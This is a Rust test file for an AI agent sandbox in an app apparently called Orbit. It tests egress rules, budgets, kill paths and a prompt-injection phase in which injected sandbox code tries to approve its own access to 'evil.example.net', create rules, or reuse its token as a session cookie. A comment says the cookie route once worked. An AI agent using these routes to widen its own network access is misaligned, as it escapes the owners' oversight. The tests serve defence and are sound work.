    let request = sqlx::query_scalar::<_, String>(
        "SELECT id FROM agent_egress_requests WHERE host = 'api.example.org'",
    )
    .fetch_one(fixture.database.pool())
    .await
    .unwrap();
    let admin_token = fixture.session(admin).await;
    let (status, _) = fixture
        .card(&admin_token, &request, json!({ "answer": "allow_always" }))
        .await;
    assert_eq!(status, StatusCode::OK);
    let (_, view) = list(teammate_token).await;
    let row = view["requests"]
        .as_array()
        .unwrap()
        .iter()
        .find(|row| row["id"] == request.as_str())
        .unwrap();
    assert_eq!(row["status"], "allowed");
    assert_eq!(row["rule"], "allow");
    assert_eq!(row["decided_by_name"], "admin");
    assert_eq!(
        flags(&view, "api.example.org"),
        ("allowed".to_owned(), false, false, false)
    );
}

#[tokio::test]
async fn only_owners_and_admins_manage_the_sandbox_and_its_rules_are_checked() {
    let fixture = Fixture::new().await;
    let driver = fixture.add_user("driver", Some("member")).await;
    let guest = fixture.add_user("guest", Some("guest")).await;
    let admin = fixture.add_user("admin", Some("admin")).await;
    let agent = fixture.add_agent(TOOLS, true).await;
    let profile = profile_of(&fixture, agent).await;
    let base = format!(
        "/api/v1/workspaces/{}/agents/{profile}",
        fixture.workspace_id
    );
    let (member_token, guest_token, admin_token) = (
        format!("Bearer {}", fixture.session(driver).await),
        format!("Bearer {}", fixture.session(guest).await),
        format!("Bearer {}", fixture.session(admin).await),
    );
    let settings = json!({ "enabled": true, "idle_minutes": 45, "cpu_minutes_month": 60, "egress_bytes_month": 1_000_000, "model_tokens_month": 5 });
    let rule = |host: &str, action: &str| json!({ "host": host, "port": 443, "action": action });

    // Guests: 404 everywhere; members: 403 (also for a rule that is not valid: they learn nothing about it).
    let sandbox = format!("{base}/sandbox");
    let rules = format!("{base}/egress-rules");
    for (token, status) in [
        (&guest_token, StatusCode::NOT_FOUND),
        (&member_token, StatusCode::FORBIDDEN),
    ] {
        assert_eq!(
            fixture.request("GET", &sandbox, token, None).await.0,
            status
        );
        assert_eq!(
            fixture
                .request("PUT", &sandbox, token, Some(settings.clone()))
                .await
                .0,
            status
        );
        assert_eq!(
            fixture
                .request(
                    "POST",
                    &rules,
                    token,
                    Some(rule("api.example.org", "allow"))
                )
                .await
                .0,
            status
        );
        assert_eq!(
            fixture
                .request("POST", &rules, token, Some(rule("*.com", "allow")))
                .await
                .0,
            status
        );
    }
    // Another workspace's (or no) agent: 404, also for admins.
    let other = format!(
        "/api/v1/workspaces/{}/agents/{}/sandbox",
        fixture.workspace_id,
        Id::new_v7()
    );
    assert_eq!(
        fixture.request("GET", &other, &admin_token, None).await.0,
        StatusCode::NOT_FOUND
    );

    // The card's switch and limits.
    let (status, view) = fixture
        .request("PUT", &sandbox, &admin_token, Some(settings.clone()))
        .await;
    assert_eq!(status, StatusCode::OK, "{view}");
    assert_eq!(view["settings"]["idle_minutes"], 45);
    assert_eq!(view["settings"]["egress_bytes_month"], 1_000_000);
    let mut bad = settings.clone();
    bad["idle_minutes"] = json!(4);
    assert_eq!(
        fixture
            .request("PUT", &sandbox, &admin_token, Some(bad))
            .await
            .0,
        StatusCode::UNPROCESSABLE_ENTITY
    );

    // Rules: the Public Suffix List, IPs, Orbit's own host and risky allows are refused.
    for (host, action) in [
        ("*.com", "allow"),
        ("*.co.uk", "allow"),
        ("*.github.io", "deny"),
        ("1.2.3.4", "allow"),
        ("*", "allow"),
        ("orbit.internal", "allow"),
        ("orbit.example.com", "allow"),
        ("*.example.com", "allow"),
        ("webhook.site", "allow"),
    ] {
        let (status, body) = fixture
            .request("POST", &rules, &admin_token, Some(rule(host, action)))
            .await;
        assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{host}: {body}");
    }
    let (status, _) = fixture
        .request(
            "POST",
            &rules,
            &admin_token,
            Some(rule("webhook.site", "deny")),
        )
        .await;
    assert_eq!(status, StatusCode::CREATED);
    let (status, view) = fixture
        .request(
            "POST",
            &rules,
            &admin_token,
            Some(rule("*.Example.org", "allow")),
        )
        .await;
    assert_eq!(status, StatusCode::CREATED);
    let allow = view["rules"]
        .as_array()
        .unwrap()
        .iter()
        .find(|row| row["host"] == "*.example.org")
        .unwrap()
        .clone();
    assert_eq!(allow["created_by_name"], "admin");

    // The rule takes effect, and the page shows the connection log.
    let thread = fixture.thread(agent, driver, "running").await;
    let (call, _, password) = fixture.call(driver, agent, &thread).await;
    assert_eq!(
        fixture
            .check(&call, &password, "api.example.org", 443)
            .await["decision"],
        "allow"
    );
    let (_, view) = fixture.request("GET", &sandbox, &admin_token, None).await;
    assert_eq!(view["log"][0]["host"], "api.example.org");
    assert_eq!(view["log"][0]["decision"], "allow");
    assert!(
        view["rules"]
            .as_array()
            .unwrap()
            .iter()
            .any(|row| row["host"] == "*.example.org" && row["last_used_at"].is_i64())
    );

    // Removing: members cannot; admins can, and the host asks again.
    let rule_url = format!("{rules}/{}", allow["id"].as_str().unwrap());
    assert_eq!(
        fixture
            .request("DELETE", &rule_url, &member_token, None)
            .await
            .0,
        StatusCode::FORBIDDEN
    );
    assert_eq!(
        fixture
            .request("DELETE", &rule_url, &admin_token, None)
            .await
            .0,
        StatusCode::OK
    );
    assert_eq!(
        fixture
            .request("DELETE", &rule_url, &admin_token, None)
            .await
            .0,
        StatusCode::NOT_FOUND
    );
    assert_eq!(
        fixture
            .check(&call, &password, "api.example.org", 443)
            .await["decision"],
        "ask"
    );
    let (_, view) = fixture.request("GET", &sandbox, &admin_token, None).await;
    assert_eq!(view["pending"][0]["host"], "api.example.org");
    assert_eq!(view["pending"][0]["can_allow_always"], true);
    assert_eq!(view["pending"][0]["can_allow_once"], false);

    let events: Vec<String> = sqlx::query_scalar(
        "SELECT action FROM audit_events WHERE action LIKE 'agent_%' ORDER BY id",
    )
    .fetch_all(fixture.database.pool())
    .await
    .unwrap();
    assert_eq!(
        events,
        [
            "agent_sandbox.settings_update",
            "agent_egress.rule_create",
            "agent_egress.rule_create",
            "agent_egress.rule_delete"
        ]
    );
}

// ---------------------------------------------------------------------------------------------
// Phase 8: budgets, notices, the kill path and the lost-call job.

use orbit_server::agent::sandbox::{month, next_month_text, notice_level, usage_text};

#[test]
fn notices_start_at_exactly_80_and_100_percent() {
    let limit = 600 * 60_000;
    assert_eq!(notice_level(0, limit), None);
    assert_eq!(notice_level(limit * 8 / 10 - 1, limit), None);
    assert_eq!(notice_level(limit * 8 / 10, limit), Some(80));
    assert_eq!(notice_level(limit - 1, limit), Some(80));
    assert_eq!(notice_level(limit, limit), Some(100));
    assert_eq!(notice_level(limit * 3, limit), Some(100));
    // Odd limits round up: 80 % of 7 is 5.6, so 5 is under and 6 is over.
    assert_eq!(notice_level(5, 7), None);
    assert_eq!(notice_level(6, 7), Some(80));
    // A limit of 0 stops the counter without notices; huge values do not overflow.
    assert_eq!(notice_level(5, 0), None);
    assert_eq!(notice_level(i64::MAX, i64::MAX), Some(100));
    assert_eq!(notice_level(i64::MAX / 2, i64::MAX), None);
}

#[test]
fn months_are_utc_and_roll_over_at_the_year_end() {
    let at = |text: &str| text.parse::<jiff::Timestamp>().unwrap().as_millisecond();
    assert_eq!(month(at("2026-11-30T23:59:59.999Z")), "2026-11");
    assert_eq!(month(at("2026-12-01T00:00:00Z")), "2026-12");
    // 23:30 on 30 November in New York is already December in UTC.
    assert_eq!(month(at("2026-11-30T23:30:00-05:00")), "2026-12");
    assert_eq!(
        next_month_text(at("2026-11-18T12:00:00Z")),
        "1 December 2026"
    );
    assert_eq!(
        next_month_text(at("2026-12-31T23:59:59Z")),
        "1 January 2027"
    );
    assert_eq!(
        usage_text("cpu", 482 * 60_000 + 59_999, 600 * 60_000),
        "482 of 600 CPU minutes"
    );
    assert_eq!(usage_text("cpu", 49_500, 60_000), "0.8 of 1 CPU minutes");
    assert_eq!(
        usage_text("egress", 1_610_612_736, 2_147_483_648),
        "1.5 GiB of 2.0 GiB"
    );
    assert_eq!(
        usage_text("egress", 5 * 1024 * 1024, 2_147_483_648),
        "5 MiB of 2.0 GiB"
    );
}

#[tokio::test]
async fn the_cpu_limit_refuses_tickets_at_100_percent_and_a_new_month_starts_again() {
    let fixture = Fixture::new().await;
    let driver = fixture.add_user("driver", Some("member")).await;
    let agent = fixture.add_agent(TOOLS, true).await;
    let thread = fixture.thread(agent, driver, "running").await;
    fixture.limits(agent, 10, 1_000_000, 1_000_000).await;
    // One millisecond under the limit: a ticket. Its end reaches the limit: the next call is refused, with the numbers.
    fixture
        .set_usage(agent, &this_month(), 10 * 60_000 - 1, 0, 0)
        .await;
    let (call, _, _) = fixture.call(driver, agent, &thread).await;
    assert_eq!(fixture.end(&call, 1).await.0, StatusCode::OK);
    assert_eq!(fixture.usage(agent).await.0, 10 * 60_000);
    let (status, refused) = fixture.issue(driver, agent, &thread).await;
    assert_eq!(status, StatusCode::FORBIDDEN);
    assert_eq!(refused["code"], "sandbox_budget_spent");
    let detail = refused["detail"].as_str().unwrap();
    assert!(detail.contains("(10 of 10 CPU minutes)"), "{detail}");
    assert!(detail.contains("Chat tools still work"), "{detail}");
    // Last month's use does not count this month.
    sqlx::query("UPDATE agent_sandbox_usage SET month = $2 WHERE agent_user_id = $1")
        .bind(agent.to_string())
        .bind(last_month())
        .execute(fixture.database.pool())
        .await
        .unwrap();
    assert_eq!(
        fixture.issue(driver, agent, &thread).await.0,
        StatusCode::OK
    );
}

#[tokio::test]
async fn the_traffic_limit_makes_the_proxy_deny_and_the_call_end_says_why() {
    let fixture = Fixture::new().await;
    let driver = fixture.add_user("driver", Some("member")).await;
    let agent = fixture.add_agent(TOOLS, true).await;
    let thread = fixture.thread(agent, driver, "running").await;
    fixture.rule(agent, "api.example.org", 443, "allow").await;
    fixture.limits(agent, 600, 1_000, 1_000_000).await;
    fixture.set_usage(agent, &this_month(), 0, 999, 0).await;
    let (call, _, password) = fixture.call(driver, agent, &thread).await;
    let allowed = fixture
        .check(&call, &password, "api.example.org", 443)
        .await;
    assert_eq!(allowed["decision"], "allow");
    let (status, _) = fixture
        .request(
            "POST",
            "/api/internal/agent/egress/done",
            &service_bearer(),
            Some(json!({ "log_id": allowed["log_id"], "call_id": call, "bytes_up": 1, "bytes_down": 0, "duration_ms": 5 })),
        )
        .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(fixture.usage(agent).await.1, 1_000);
    let denied = fixture
        .check(&call, &password, "api.example.org", 443)
        .await;
    assert_eq!(denied["decision"], "deny");
    assert_eq!(
        denied["reason"],
        "the agent's internet traffic for this month is spent"
    );
    // The model learns why (in the sandbox it saw only a 403).
    let (_, ended) = fixture.end(&call, 10).await;
    assert_eq!(
        ended["egress_denied"],
        json!([{ "host": "api.example.org", "port": 443, "reason": "the agent's internet traffic for this month is spent" }])
    );
    // The sandbox itself still runs (only the internet is off).
    assert_eq!(
        fixture.issue(driver, agent, &thread).await.0,
        StatusCode::OK
    );
}

#[tokio::test]
async fn budget_notices_go_once_per_level_and_month_to_owners_and_admins_only() {
    let fixture = Fixture::new().await;
    let driver = fixture.add_user("driver", Some("member")).await;
    fixture.add_user("admin", Some("admin")).await;
    let agent = fixture.add_agent(TOOLS, true).await;
    let thread = fixture.thread(agent, driver, "running").await;
    fixture.limits(agent, 10, 1_000_000, 1_000_000).await;
    let end = |cpu_ms: i64| {
        let fixture = &fixture;
        let thread = thread.clone();
        async move {
            let (call, _, _) = fixture.call(driver, agent, &thread).await;
            assert_eq!(fixture.end(&call, cpu_ms).await.0, StatusCode::OK);
        }
    };
    let month = this_month();
    // 79.99 %: nothing. 80 %: one notice to the owner and the admin (not the member). More under 100 %: nothing new.
    end(8 * 60_000 - 1).await;
    assert!(fixture.notices(agent).await.is_empty());
    end(1).await;
    let sent = fixture.notices(agent).await;
    assert_eq!(sent.len(), 1, "{sent:?}");
    assert_eq!(sent[0].0, format!("budget:{month}:cpu:80"));
    assert_eq!(sent[0].1, 2, "the owner and the admin");
    assert!(
        sent[0]
            .2
            .starts_with("Heads-up: I used 80 % of my sandbox CPU time"),
        "{}",
        sent[0].2
    );
    assert!(sent[0].2.contains("(8 of 10 CPU minutes)"), "{}", sent[0].2);
    end(60_000).await;
    assert_eq!(fixture.notices(agent).await.len(), 1);
    // 100 %: one more, once (two calls that started under the limit end past it).
    let (first, _, _) = fixture.call(driver, agent, &thread).await;
    let (second, _, _) = fixture.call(driver, agent, &thread).await;
    fixture.end(&first, 60_000).await;
    fixture.end(&second, 60_000).await;
    assert_eq!(fixture.usage(agent).await.0, 11 * 60_000);
    let sent = fixture.notices(agent).await;
    assert_eq!(sent.len(), 2, "{sent:?}");
    assert_eq!(sent[1].0, format!("budget:{month}:cpu:100"));
    assert_eq!(sent[1].1, 2);
    assert!(
        sent[1].2.starts_with("I used all of my sandbox CPU time"),
        "{}",
        sent[1].2
    );
    let members: Vec<String> = sqlx::query_scalar(
        "SELECT DISTINCT cm.user_id FROM chat_messages m JOIN chat_members cm ON cm.conversation_id = m.conversation_id \
         WHERE m.author_id = $1 AND m.nonce LIKE 'budget:%' AND cm.user_id <> $1",
    )
    .bind(agent.to_string())
    .fetch_all(fixture.database.pool())
    .await
    .unwrap();
    assert_eq!(members.len(), 2);
    assert!(!members.contains(&driver.to_string()));

    // A jump straight past 100 % (traffic) sends only the 100 % notice, and marks 80 % as sent.
    let other = fixture.add_agent(TOOLS, true).await;
    fixture.limits(other, 600, 1_000, 1_000_000).await;
    fixture.rule(other, "api.example.org", 443, "allow").await;
    let other_thread = fixture.thread(other, driver, "running").await;
    let (call, _, password) = fixture.call(driver, other, &other_thread).await;
    let allowed = fixture
        .check(&call, &password, "api.example.org", 443)
        .await;
    fixture
        .request(
            "POST",
            "/api/internal/agent/egress/done",
            &service_bearer(),
            Some(json!({ "log_id": allowed["log_id"], "call_id": call, "bytes_up": 600, "bytes_down": 600, "duration_ms": 5 })),
        )
        .await;
    let sent = fixture.notices(other).await;
    assert_eq!(sent.len(), 1, "{sent:?}");
    assert_eq!(sent[0].0, format!("budget:{month}:egress:100"));
    let levels: i64 = sqlx::query_scalar(
        "SELECT COUNT(*) FROM agent_sandbox_notices WHERE agent_user_id = $1 AND counter = 'egress'",
    )
    .bind(other.to_string())
    .fetch_one(fixture.database.pool())
    .await
    .unwrap();
    assert_eq!(levels, 2);

    // Last month's notices do not stop this month's.
    let third = fixture.add_agent(TOOLS, true).await;
    fixture.limits(third, 10, 1_000_000, 1_000_000).await;
    sqlx::query(
        "INSERT INTO agent_sandbox_notices (agent_user_id, month, counter, level, sent_at) VALUES ($1, $2, 'cpu', 80, 0)",
    )
    .bind(third.to_string())
    .bind(last_month())
    .execute(fixture.database.pool())
    .await
    .unwrap();
    let third_thread = fixture.thread(third, driver, "running").await;
    let (call, _, _) = fixture.call(driver, third, &third_thread).await;
    fixture.end(&call, 8 * 60_000).await;
    assert_eq!(fixture.notices(third).await.len(), 1);
}

#[tokio::test]
async fn model_tokens_count_once_per_run_and_flag_the_agents_inputs_at_the_limit() {
    let fixture = Fixture::new().await;
    let agent = fixture.add_agent(TOOLS, true).await;
    fixture.limits(agent, 600, 1_000_000, 1_000).await;
    let report = |run: String, tokens: i64, auth: String| {
        let fixture = &fixture;
        async move {
            fixture
                .request(
                    "POST",
                    &format!("/api/internal/agent/runs/{run}/usage"),
                    &auth,
                    Some(json!({ "agent_user_id": agent.to_string(), "tokens": tokens })),
                )
                .await
        }
    };
    let sidecar = format!("Bearer {SECRET}");
    let run = Id::new_v7().to_string();
    assert_eq!(
        report(run.clone(), 900, "Bearer nope".to_owned()).await.0,
        StatusCode::UNAUTHORIZED
    );
    assert_eq!(
        report(run.clone(), 900, service_bearer()).await.0,
        StatusCode::UNAUTHORIZED
    );
    let (status, first) = report(run.clone(), 900, sidecar.clone()).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(first["counted"], true);
    let (_, again) = report(run.clone(), 900, sidecar.clone()).await;
    assert_eq!(again["counted"], false);
    assert_eq!(fixture.usage(agent).await.2, 900);
    // Not a custom agent (the default agent has no limit).
    let (status, _) = fixture
        .request(
            "POST",
            &format!("/api/internal/agent/runs/{}/usage", Id::new_v7()),
            &sidecar,
            Some(json!({ "agent_user_id": fixture.owner().await.to_string(), "tokens": 5 })),
        )
        .await;
    assert_eq!(status, StatusCode::NOT_FOUND);

    // An input for the agent: not flagged at 90 %, flagged at 100 %.
    let owner = fixture.owner().await;
    let message = Id::new_v7().to_string();
    sqlx::query(
        "INSERT INTO agent_inputs (message_id, workspace_id, conversation_id, thread_key, author_id, kind, created_at, \
         agent_user_id) VALUES ($1, $2, $3, $4, $5, 'instruction', $6, $7)",
    )
    .bind(&message)
    .bind(&fixture.workspace_id)
    .bind(&fixture.conversation)
    .bind(Id::new_v7().to_string())
    .bind(owner.to_string())
    .bind(TimestampMillis::now().as_millis())
    .bind(agent.to_string())
    .execute(fixture.database.pool())
    .await
    .unwrap();
    let flag = |polled: Value| {
        polled["inputs"]
            .as_array()
            .unwrap()
            .iter()
            .find(|input| input["message_id"] == message.as_str())
            .map(|input| input["agent"]["model_tokens_spent"].clone())
    };
    assert_eq!(flag(fixture.poll().await), Some(json!(false)));
    report(Id::new_v7().to_string(), 100, sidecar.clone()).await;
    assert_eq!(fixture.usage(agent).await.2, 1_000);
    assert_eq!(flag(fixture.poll().await), Some(json!(true)));
    // 900 of 1,000 sent the 80 % notice; the run that reached 1,000 sent the 100 % one.
    let sent = fixture.notices(agent).await;
    assert_eq!(
        sent.iter()
            .map(|notice| notice.0.clone())
            .collect::<Vec<_>>(),
        [
            format!("budget:{}:tokens:80", this_month()),
            format!("budget:{}:tokens:100", this_month())
        ]
    );
}

#[tokio::test]
async fn switching_off_ends_running_calls_and_queues_a_stop_that_only_the_sidecar_confirms() {
    let fixture = Fixture::new().await;
    let driver = fixture.add_user("driver", Some("member")).await;
    let agent = fixture.add_agent(TOOLS, true).await;
    let thread = fixture.thread(agent, driver, "running").await;
    let (call, token, password) = fixture.call(driver, agent, &thread).await;
    assert_eq!(fixture.tasks_with(&token).await, StatusCode::OK);
    let polled = fixture.poll().await;
    assert_eq!(polled["sandbox_stops"], json!([]));
    assert_eq!(polled["agent_sandbox"], true);

    let owner = fixture.session(fixture.owner().await).await;
    let profile = profile_of(&fixture, agent).await;
    let path = format!(
        "/api/v1/workspaces/{}/agents/{profile}/sandbox",
        fixture.workspace_id
    );
    let off = json!({ "enabled": false, "idle_minutes": 30, "cpu_minutes_month": 600,
        "egress_bytes_month": 2_147_483_648_i64, "model_tokens_month": 20_000_000 });
    // A member cannot switch it off (and nothing stops).
    let member = fixture.session(driver).await;
    let (status, _) = fixture
        .request("PUT", &path, &format!("Bearer {member}"), Some(off.clone()))
        .await;
    assert_eq!(status, StatusCode::FORBIDDEN);
    assert_eq!(fixture.call_row(&call).await.0, "running");

    let (status, _) = fixture
        .request("PUT", &path, &format!("Bearer {owner}"), Some(off))
        .await;
    assert_eq!(status, StatusCode::OK);
    // The call ended at once: its token is dead and the proxy denies its password.
    assert_eq!(
        fixture.call_row(&call).await,
        (
            "done".to_owned(),
            Some("the sandbox was switched off".to_owned()),
            0
        )
    );
    assert_eq!(fixture.tasks_with(&token).await, StatusCode::UNAUTHORIZED);
    let decided = fixture
        .check(&call, &password, "api.example.org", 443)
        .await;
    assert_eq!(decided["decision"], "deny");
    // One stop for the sidecar, with the reason the model reads.
    let stops = fixture.poll().await["sandbox_stops"].clone();
    assert_eq!(stops.as_array().unwrap().len(), 1, "{stops}");
    assert_eq!(stops[0]["agent_user_id"], agent.to_string());
    assert_eq!(stops[0]["reason"], "the sandbox was switched off");
    // Only the sidecar confirms it.
    let done = format!(
        "/api/internal/agent/sandbox/stops/{}/done",
        stops[0]["id"].as_str().unwrap()
    );
    for auth in [
        "Bearer nope".to_owned(),
        service_bearer(),
        format!("Bearer {owner}"),
    ] {
        let (status, _) = fixture.request("POST", &done, &auth, None).await;
        assert_eq!(status, StatusCode::UNAUTHORIZED, "{auth}");
    }
    let (status, _) = fixture
        .request("POST", &done, &format!("Bearer {SECRET}"), None)
        .await;
    assert_eq!(status, StatusCode::NO_CONTENT);
    assert_eq!(fixture.poll().await["sandbox_stops"], json!([]));
    // The broker's end comes later: the CPU time until the kill still counts.
    assert_eq!(fixture.end(&call, 1_234).await.0, StatusCode::OK);
    assert_eq!(fixture.usage(agent).await.0, 1_234);
    assert_eq!(fixture.call_row(&call).await.2, 1_234);

    // An agent without a call in a sandbox's life has no live sandbox: switching it off queues no stop.
    let quiet = fixture.add_agent(TOOLS, true).await;
    let (status, _) = fixture
        .request(
            "PUT",
            &format!(
                "/api/v1/workspaces/{}/agents/{}/sandbox",
                fixture.workspace_id,
                profile_of(&fixture, quiet).await
            ),
            &format!("Bearer {owner}"),
            Some(
                json!({ "enabled": false, "idle_minutes": 30, "cpu_minutes_month": 600,
                "egress_bytes_month": 1_000, "model_tokens_month": 1_000 }),
            ),
        )
        .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(fixture.poll().await["sandbox_stops"], json!([]));
}

#[tokio::test]
async fn unticking_the_sandbox_tool_or_deleting_the_agent_stops_its_sandboxes() {
    let fixture = Fixture::new().await;
    let driver = fixture.add_user("driver", Some("member")).await;
    let owner = fixture.session(fixture.owner().await).await;
    for delete in [false, true] {
        let agent = fixture.add_agent(TOOLS, true).await;
        let thread = fixture.thread(agent, driver, "running").await;
        let (call, token, _) = fixture.call(driver, agent, &thread).await;
        let path = format!(
            "/api/v1/workspaces/{}/agents/{}",
            fixture.workspace_id,
            profile_of(&fixture, agent).await
        );
        // Another change that keeps the tool stops nothing.
        let (status, value) = fixture
            .request(
                "PATCH",
                &path,
                &format!("Bearer {owner}"),
                Some(json!({ "tools": ["sandbox_shell"] })),
            )
            .await;
        assert_eq!(status, StatusCode::OK, "{value}");
        assert_eq!(fixture.call_row(&call).await.0, "running");
        let (status, value) = if delete {
            fixture
                .request("DELETE", &path, &format!("Bearer {owner}"), None)
                .await
        } else {
            fixture
                .request(
                    "PATCH",
                    &path,
                    &format!("Bearer {owner}"),
                    Some(json!({ "tools": ["search_tasks"] })),
                )
                .await
        };
        assert!(status.is_success(), "{status} {value}");
        let reason = if delete {
            "the agent was deleted"
        } else {
            "the sandbox tool was turned off for this agent"
        };
        assert_eq!(
            fixture.call_row(&call).await,
            ("done".to_owned(), Some(reason.to_owned()), 0)
        );
        assert_eq!(fixture.tasks_with(&token).await, StatusCode::UNAUTHORIZED);
        let stops = fixture.poll().await["sandbox_stops"].clone();
        assert_eq!(stops.as_array().unwrap().len(), 1, "{stops}");
        assert_eq!(stops[0]["agent_user_id"], agent.to_string());
        assert_eq!(stops[0]["reason"], reason);
        let done = format!(
            "/api/internal/agent/sandbox/stops/{}/done",
            stops[0]["id"].as_str().unwrap()
        );
        fixture
            .request("POST", &done, &format!("Bearer {SECRET}"), None)
            .await;
    }
}

#[tokio::test]
async fn the_lost_call_job_closes_calls_once_and_ends_every_call_while_sandboxes_are_off() {
    use orbit_server::agent::sandbox::{Sweep, sweep};
    let fixture = Fixture::new().await;
    let driver = fixture.add_user("driver", Some("member")).await;
    let agent = fixture.add_agent(TOOLS, true).await;
    let thread = fixture.thread(agent, driver, "running").await;
    let (lost, lost_token, lost_password) = fixture.call(driver, agent, &thread).await;
    let (fresh, fresh_token, _) = fixture.call(driver, agent, &thread).await;
    let now = TimestampMillis::now().as_millis();
    // Nothing is due: nothing changes.
    assert_eq!(sweep(&fixture.agent, now).await.unwrap(), Sweep::default());
    // Past its 120 s timeout and the 5 minutes of grace: lost, once.
    sqlx::query("UPDATE agent_sandbox_calls SET started_at = $2 WHERE id = $1")
        .bind(&lost)
        .bind(now - 8 * 60 * 1000)
        .execute(fixture.database.pool())
        .await
        .unwrap();
    assert_eq!(
        sweep(&fixture.agent, now).await.unwrap(),
        Sweep {
            lost: 1,
            interrupted: 0
        }
    );
    assert_eq!(sweep(&fixture.agent, now).await.unwrap(), Sweep::default());
    assert_eq!(fixture.call_row(&lost).await.0, "lost");
    assert_eq!(
        fixture.tasks_with(&lost_token).await,
        StatusCode::UNAUTHORIZED
    );
    let decided = fixture
        .check(&lost, &lost_password, "api.example.org", 443)
        .await;
    assert_eq!(decided["decision"], "deny");
    assert_eq!(fixture.call_row(&fresh).await.0, "running");
    assert_eq!(fixture.tasks_with(&fresh_token).await, StatusCode::OK);
    // The broker reports late: the CPU time counts once, the call stays lost.
    fixture.end(&lost, 700).await;
    fixture.end(&lost, 700).await;
    assert_eq!(fixture.usage(agent).await.0, 700);
    assert_eq!(
        fixture.call_row(&lost).await,
        ("lost".to_owned(), None, 700)
    );

    // Sandboxes off on this server (no broker key): every running call ends, once; the sidecar is told to stop all.
    let off = fixture.agent.clone().with_sandbox(None);
    assert_eq!(
        sweep(&off, now).await.unwrap(),
        Sweep {
            lost: 0,
            interrupted: 1
        }
    );
    assert_eq!(sweep(&off, now).await.unwrap(), Sweep::default());
    assert_eq!(
        fixture.call_row(&fresh).await,
        (
            "done".to_owned(),
            Some("agent sandboxes are off on this server".to_owned()),
            0
        )
    );
    assert_eq!(
        fixture.tasks_with(&fresh_token).await,
        StatusCode::UNAUTHORIZED
    );
}

// ---------------------------------------------------------------------------------------------
// Phase 9: prompt injection. Hostile content (a web page, a file, a chat message, tool output) makes the agent's
// sandbox code try each of these with what it has: the call token, the proxy password and its own network. The
// server and the proxy must refuse every one, whatever the model does.

impl Fixture {
    /// A request with any headers (sandbox code may send whatever it likes).
    async fn raw(
        &self,
        method: &str,
        uri: &str,
        headers: &[(&str, &str)],
        body: Option<Value>,
    ) -> (StatusCode, Value) {
        let mut builder = Request::builder().method(method).uri(uri);
        for (name, value) in headers {
            builder = builder.header(*name, *value);
        }
        let request = match body {
            Some(value) => builder
                .header(header::CONTENT_TYPE, "application/json")
                .body(Body::from(value.to_string())),
            None => builder.body(Body::empty()),
        }
        .unwrap();
        let response = self.app.clone().oneshot(request).await.unwrap();
        let status = response.status();
        let bytes = to_bytes(response.into_body(), usize::MAX).await.unwrap();
        (
            status,
            serde_json::from_slice(&bytes).unwrap_or(Value::Null),
        )
    }
}

#[tokio::test]
async fn injection_the_call_token_cannot_answer_its_own_card_make_rules_or_leave_its_scope() {
    let fixture = Fixture::new().await;
    // The worst case: the driver is the owner, so the driver's own rights would allow everything.
    let driver = fixture.owner().await;
    let agent = fixture.add_agent(TOOLS, true).await;
    let profile = profile_of(&fixture, agent).await;
    let thread = fixture.thread(agent, driver, "running").await;
    let (call, token, password) = fixture.call(driver, agent, &thread).await;
    let asked = fixture
        .check(&call, &password, "evil.example.net", 443)
        .await;
    assert_eq!(asked["decision"], "ask");
    let request = asked["request_id"].as_str().unwrap().to_owned();
    let ws = &fixture.workspace_id;
    let bearer = format!("Bearer {token}");

    // With the token as a bearer: the scope layer refuses every route about access, rules, the card or settings.
    for (method, uri, body) in [
        (
            "POST",
            format!("/api/v1/workspaces/{ws}/agents/egress-requests/{request}"),
            Some(json!({ "answer": "allow_once" })),
        ),
        (
            "POST",
            format!("/api/v1/workspaces/{ws}/agents/egress-requests/{request}"),
            Some(json!({ "answer": "allow_always" })),
        ),
        (
            "GET",
            format!(
                "/api/v1/workspaces/{ws}/agents/egress-requests?conversation_id={}",
                fixture.conversation
            ),
            None,
        ),
        (
            "POST",
            format!("/api/v1/workspaces/{ws}/agents/{profile}/egress-rules"),
            Some(json!({ "host": "evil.example.net", "port": 443, "action": "allow" })),
        ),
        (
            "PUT",
            format!("/api/v1/workspaces/{ws}/agents/{profile}/sandbox"),
            Some(
                json!({ "enabled": true, "idle_minutes": 30, "cpu_minutes_month": 100000, "egress_bytes_month": 1, "model_tokens_month": 1 }),
            ),
        ),
        (
            "GET",
            format!("/api/v1/workspaces/{ws}/agents/{profile}/sandbox"),
            None,
        ),
        (
            "GET",
            format!("/api/v1/workspaces/{ws}/agent-integrations"),
            None,
        ),
        ("GET", format!("/api/v1/workspaces/{ws}/agent-skills"), None),
        ("GET", format!("/api/v1/workspaces/{ws}/audit"), None),
        (
            "GET",
            format!("/api/v1/workspaces/{}/tasks", Id::new_v7()),
            None,
        ),
        ("GET", "/api/v1/me".to_owned(), None),
    ] {
        let (status, value) = fixture.request(method, &uri, &bearer, body).await;
        assert_eq!(status, StatusCode::FORBIDDEN, "{method} {uri}: {value}");
        assert_eq!(value["code"], "agent_scope", "{method} {uri}");
    }
    // Orbit's internal routes take service keys only.
    for (uri, body) in [
        (
            "/api/internal/agent/egress/check".to_owned(),
            json!({ "call_id": call, "proxy_password": password, "host": "evil.example.net", "port": 443 }),
        ),
        (
            "/api/internal/agent/sandbox/calls".to_owned(),
            json!({ "workspace_id": ws, "user_id": driver.to_string(), "agent_user_id": agent.to_string(), "thread_key": thread }),
        ),
        (
            format!("/api/internal/agent/sandbox/calls/{call}/end"),
            json!({ "exit": 0, "cpu_ms": 0 }),
        ),
    ] {
        let (status, value) = fixture.request("POST", &uri, &bearer, Some(body)).await;
        assert!(
            matches!(status, StatusCode::FORBIDDEN | StatusCode::UNAUTHORIZED),
            "{uri}: {status} {value}"
        );
    }

    // With the token as a session cookie (no bearer, an Origin like the browser app's): refused too, before any
    // route reads the cookie. Before phase 9 this answered the card as the owner.
    let card = format!("/api/v1/workspaces/{ws}/agents/egress-requests/{request}");
    for cookie in [
        format!("__Host-orbit_session={token}"),
        format!("orbit_session_dev={token}"),
        format!("theme=dark; __Host-orbit_session={token}"),
    ] {
        for answer in ["allow_once", "allow_always"] {
            let (status, value) = fixture
                .raw(
                    "POST",
                    &card,
                    &[
                        ("cookie", cookie.as_str()),
                        ("origin", "https://orbit.example.com"),
                    ],
                    Some(json!({ "answer": answer })),
                )
                .await;
            assert_eq!(
                status,
                StatusCode::UNAUTHORIZED,
                "{cookie} {answer}: {value}"
            );
        }
        let (status, _) = fixture
            .raw(
                "GET",
